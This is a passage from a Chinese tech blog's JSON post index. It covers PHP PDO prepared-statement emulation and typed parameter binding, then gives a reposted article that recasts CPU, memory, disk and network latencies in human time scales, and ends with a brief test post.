FALSE）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。 需要 bool 类型。 PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。 这是之前我说的默认总是模拟prepare,因为低版本MYSQL驱动不支持prepare.数据类型问题,在旧版本的MySQL中还真是不能解决的。它直接返回字符串给外部系统。稍微新一点的MySQL和客户端驱动可以直接内部的本地类型而不再进行内部转换为字符串了。有了这个基础，就有解决的可能了。 Test-code此处用query测试证明,prepare_excute二连也是一样的 1234$db = new \\PDO('mysql:dbname='.$options['database'].';host='.$options['host'], $options['user'], $options['password']);$db-&gt;setAttribute(\\PDO::ATTR_EMULATE_PREPARES, false);//关闭预处理语句模拟$r = ($db-&gt;query('SELECT * FROM test WHERE `id`=1 LIMIT 1', \\PDO::FETCH_ASSOC))-&gt;fetch();var_dump($r); $result123456array(2) &#123; [0]=&gt; int(1) [1]=&gt; string(64) \"1dfd47ed5fb0183d05157f21cab0fd8c151379f407a173190445bbd82aa5aeaa\"&#125; 此外,PDO为参数绑定也提供了强类型的设定,默认传给Mysql的是string,常用的类型如下: 1234567$data_types = [ 'NULL' =&gt; PDO::PARAM_NULL, 'boolean' =&gt; PDO::PARAM_BOOL, 'integer' =&gt; PDO::PARAM_INT, 'string' =&gt; PDO::PARAM_STR,]$this-&gt;sm-&gt;bindParam(':id', $id, $data_types[getType($id)]); datatype: 使用[*PDO :: PARAM ** 常量](http://php.net/manual/en/pdo.constants.php)来设定参数的显式数据类型。要从存储过程返回INOUT参数，请使用按位或运算符来设置`data_type`参数的PDO :: PARAM_INPUT_OUTPUT位。","categories":[{"name":"PHP","slug":"PHP","permalink":"http://www.twosee.cn/categories/PHP/"},{"name":"Mysql","slug":"PHP/Mysql","permalink":"http://www.twosee.cn/categories/PHP/Mysql/"}],"tags":[{"name":"PDO","slug":"PDO","permalink":"http://www.twosee.cn/tags/PDO/"},{"name":"Mysql","slug":"Mysql","permalink":"http://www.twosee.cn/tags/Mysql/"},{"name":"参数化","slug":"参数化","permalink":"http://www.twosee.cn/tags/参数化/"}]},{"title":"让 CPU 告诉你硬盘和网络到底有多慢","slug":"how-slow-is-disk-and-network","date":"2017-12-28T08:18:03.000Z","updated":"2018-01-08T07:19:42.000Z","comments":true,"path":"2017/12/28/how-slow-is-disk-and-network/","link":"","permalink":"http://www.twosee.cn/2017/12/28/how-slow-is-disk-and-network/","excerpt":"本文转载自 cizixs 简介经常听到有人说磁盘很慢、网络很卡，这都是站在人类的感知维度去表述的，比如拷贝一个文件到硬盘需要几分钟到几十分钟，够我去吃个饭啦；而从网络下载一部电影，有时候需要几个小时，我都可以睡一觉了。 最为我们熟知的关于计算机不同组件速度差异的图表，是下面这种金字塔形式：越往上速度越快，容量越小，而价格越高。这张图只是给了我们一个直观地感觉，并没有对各个速度和性能做出量化的说明和解释。而实际上，不同层级之间的差异要比这张图大的多。这篇文章就让你站在 CPU 的角度看这个世界，说说到底它们有多慢。 img 希望你看到看完这篇文章能明白两件事情：磁盘和网络真的很慢，性能优化是个复杂的系统性的活。","text":"本文转载自 cizixs 简介经常听到有人说磁盘很慢、网络很卡，这都是站在人类的感知维度去表述的，比如拷贝一个文件到硬盘需要几分钟到几十分钟，够我去吃个饭啦；而从网络下载一部电影，有时候需要几个小时，我都可以睡一觉了。 最为我们熟知的关于计算机不同组件速度差异的图表，是下面这种金字塔形式：越往上速度越快，容量越小，而价格越高。这张图只是给了我们一个直观地感觉，并没有对各个速度和性能做出量化的说明和解释。而实际上，不同层级之间的差异要比这张图大的多。这篇文章就让你站在 CPU 的角度看这个世界，说说到底它们有多慢。 img 希望你看到看完这篇文章能明白两件事情：磁盘和网络真的很慢，性能优化是个复杂的系统性的活。 注：所有的数据都是来自这个地址。所有的数据会因为机器配置不同，或者硬件的更新而有出入，但是不影响我们直觉的感受。如果对这些数据比较感兴趣，这个网址给出了不同年份一些指标的数值。 数据 先来看看 CPU 的速度，就拿我的电脑来说，主频是 2.6G，也就是说每秒可以执行 2.6*10^9个指令，每个指令只需要 0.38ns（现在很多个人计算机的主频要比这个高，配置比较高的能达到 3.0G+）。我们把这个时间当做基本单位 1s，因为 1s 大概是人类能感知的最小时间单位。 img 一级缓存读取时间为 0.5ns，换算成人类时间大约是 1.3s，大约一次或者两次心跳的时间。这里能看出缓存的重要性，因为它的速度可以赶上 CPU，程序本身的 locality 特性加上指令层级上的优化，cache 访问的命中率很高，这最终能极大提高效率。 分支预测错误需要耗时 5ns，换算成人类时间大约是 13s，这个就有点久了，所以你会看到很多文章分析如何优化代码来降低分支预测的几率，比如这个得分非常高的 stackoverflow 问题。 二级缓存时间就比较久了，大约在 7ns，换算成人类时间大约是 18.2s，可以看到的是如果一级缓存没有命中，然后去二级缓存读取数据，时间差了一个数量级。 小知识：为什么需要多层的 CPU 缓存呢？这篇文章通过一个通俗易懂的例子给出了讲解。 我们继续，互斥锁的加锁和解锁时间需要 25ns，换算成人类时间大约是 65s，首次达到了一分钟。并发编程中，我们经常听说锁是一个很耗时的东西，因为在微波炉里加热一个东西需要一分钟的话，你要在那傻傻地等蛮久了。 然后就到了内存，每次内存寻址需要 100ns，换算成人类时间是 260s，也就是4分多钟，如果读一些不需要太多思考的文章，这么久能读完2-3千字（这个快阅读的时代，很少人在手机上能静心多这么字了）。看起来还不算坏，不多要从内存中读取一段数据需要的时间会更多。到了内存之后，时间就变了一个量级，CPU 和内存之间的速度瓶颈被称为冯诺依曼瓶颈。 一次 CPU 上下文切换（系统调用）需要大约 1500ns，也就是 1.5us（这个数字参考了这篇文章，采用的是单核 CPU 线程平均时间），换算成人类时间大约是 65分钟，嗯，也就是一个小时。我们也知道上下文切换是很耗时的行为，毕竟每次浪费一个小时，也很让人有罪恶感的。上下文切换更恐怖的事情在于，这段时间里 CPU 没有做任何有用的计算，只是切换了两个不同进程的寄存器和内存状态；而且这个过程还破坏了缓存，让后续的计算更加耗时。 在 1Gbps 的网络上传输 2K 的数据需要 20us，换算成人类时间是 14.4小时，这么久都能把《星球大战》六部曲看完了（甚至还加上吃饭撒尿的时间）！可以看到网络上非常少数据传输对于 CPU 来说，已经很漫长。而且这里的时间还是理论最大值，实际过程还要更慢一些。 SSD 随机读取耗时为 150us，换算成人类时间大约是 4.5天。换句话说，SSD 读点数据，CPU 都能休假，报团参加周边游了。虽然我们知道 SSD 要比机械硬盘快很多，但是这个速度对于 CPU 来说也是像乌龟一样。I/O 设备 从硬盘开始速度开始变得漫长，这个时候我们就想起内存的好处了。尽量减少 IO 设备的读写，把最常用的数据放到内存中作为缓存是所有程序的通识。像 memcached 和 redis 这样的高速缓存系统近几年的异军突起，就是解决了这里的问题。 从内存中读取 1MB 的连续数据，耗时大约为 250us，换算成人类时间是 7.5天，这次假期升级到国庆七天国外游了。 同一个数据中心网络上跑一个来回需要 0.5ms，换算成人类时间大约是 15天，也就是半个月的时间。如果你的程序有段代码需要和数据中心的其他服务器交互，在这段时间里 CPU 都已经狂做了半个月的运算。减少不同服务组件的网络请求，是性能优化的一大课题。 从 SSD 读取 1MB 的顺序数据，大约需要 1ms，换算成人类时间是 1个月。也就是说 SSD 读一个普通的文件，如果要等你做完，CPU 一个月时间就荒废了。尽管如此，SSD 已经很快啦，不信你看下面机械磁盘的表现。 磁盘寻址时间为 10ms，换算成人类时间是 10个月，刚好够人类创造一个新的生命了。如果 CPU 需要让磁盘泡杯咖啡，在它眼里，磁盘去生了个孩子，回来告诉它你让我泡的咖啡好了。机械硬盘使用 RPM(Revolutions Per Minute/每分钟转速) 来评估磁盘的性能：RPM 越大，平均寻址时间更短，磁盘性能越好。寻址只是把磁头移动到正确的磁道上，然后才能读取指定扇区的内容。换句话说，寻址虽然很浪费时间，但其实它并没有办任何的正事（读取磁盘内容）。 从磁盘读取 1MB 连续数据需要 20ms，换算成人类时间是 20个月。IO 设备是计算机系统的瓶颈，希望读到这里你能更深切地理解这句话！如果还不理解，不妨想想你在网上买的东西，快递送了将近两年，你的心情是怎么样的。 而从世界上不同城市网络上走一个来回，平均需要 150ms（参考世界各地 ping 报文的时间），换算成人类时间是 12.5年。不难理解，所有的程序和架构都会尽量避免不同城市甚至是跨国家的网络访问，CDN 就是这个问题的一个解决方案：让用户和最接近自己的服务器交互，从而减少网络上报文的传输时间。 虚拟机重启一次大约要 4s 时间，换算成人类的时间是 3百多年。对于此，我想到了乔布斯要死命优化 Mac 系统开机启动时间的故事。如果机器能少重启而且每次启动能快一点，不仅能救人命，也能救 CPU 的命。 物理服务器重启一次需要 5min，换算成人类时间是 2万5千年，快赶上人类的文明史了。5 分钟人类都要等一会了，更别提 CPU 了，所以没事不要乱重启服务器啊，分分钟终结一个文明的节奏。 参考资料 What Every Programmer Should Know About Memory Getting Physical With Memory","categories":[{"name":"编程原理","slug":"编程原理","permalink":"http://www.twosee.cn/categories/编程原理/"}],"tags":[{"name":"cpu","slug":"cpu","permalink":"http://www.twosee.cn/tags/cpu/"},{"name":"memory","slug":"memory","permalink":"http://www.twosee.cn/tags/memory/"},{"name":"disk","slug":"disk","permalink":"http://www.twosee.cn/tags/disk/"},{"name":"network","slug":"network","permalink":"http://www.twosee.cn/tags/network/"}]},{"title":"woo","slug":"test","date":"2017-12-28T02:40:00.000Z","updated":"2017-12-28T02:51:09.000Z","comments":true,"path":"2017/12/28/test/","link":"","permalink":"http://www.twosee.cn/2017/12/28/test/","excerpt":"","text":"(｡･∀･)ﾉﾞ👁SEE IS THE 🐳SEA OF CC😎My name is cc, so I’m Twosee.","categories":[],"tags":[]}]}